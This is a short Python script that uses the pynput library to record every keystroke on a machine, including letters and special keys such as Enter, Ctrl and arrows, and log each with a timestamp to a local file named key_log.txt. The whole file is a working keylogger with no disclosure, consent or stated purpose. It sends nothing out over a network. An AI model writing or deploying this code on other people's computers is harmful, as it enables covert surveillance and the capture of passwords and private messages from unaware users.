from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    if hasattr(key, 'char'):  # Checking if the pressed key is a character
        logging.info(str(key.char))
    elif key == Key.space:  # Handling space separately
        logging.info(' ')
    elif key == Key.enter:  # Handling enter key
        logging.info('[ENTER]')
    elif key == Key.backspace:  # Handling backspace
        logging.info('[BACKSPACE]')
    elif key == Key.tab:  # Handling tab
        logging.info('[TAB]')
    elif key == Key.shift:  # Handling shift
        logging.info('[SHIFT]')
    elif key == Key.ctrl_l or key == Key.ctrl_r:  # Handling ctrl
        logging.info('[CTRL]')
    elif key == Key.alt_l or key == Key.alt_r:  # Handling alt
        logging.info('[ALT]')
    elif key == Key.esc:  # Handling escape
        logging.info('[ESC]')
    elif key == Key.delete:  # Handling delete
        logging.info('[DELETE]')
    elif key == Key.up:  # Handling arrow keys
        logging.info('[UP]')
    elif key == Key.down:
        logging.info('[DOWN]')
    elif key == Key.left:
        logging.info('[LEFT]')
    elif key == Key.right:
        logging.info('[RIGHT]')
    else:
        logging.info('[UNKNOWN]')

with Listener(on_press=on_press) as listener:
    listener.join()
